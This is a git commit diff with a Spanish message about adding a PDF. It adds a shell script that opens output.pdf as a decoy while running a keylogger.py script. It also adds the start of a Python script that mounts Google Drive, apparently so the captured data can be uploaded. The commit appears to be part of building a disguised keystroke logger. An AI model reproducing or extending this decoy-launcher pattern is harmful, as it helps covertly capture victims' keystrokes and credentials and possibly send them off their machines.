da90dc458fef6add7d0db11b19ec5b54126e3553
mario-lestaire <mario.lestaire@hotmail.com>
2023-11-08 03:34:37 -0500

    añadiendo .pdf

---
+++ scriptv2.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+open output.pdf
+./keylogger.py
---
+++ subirdrive.py
@@ -0,0 +1,8 @@
+#!/usr/bin/env python3
+
+from google.colab import drive
+from pydrive.auth import GoogleAuth
+from pydrive.drive import GoogleDrive
+
+drive.mount('/content/drive')
+
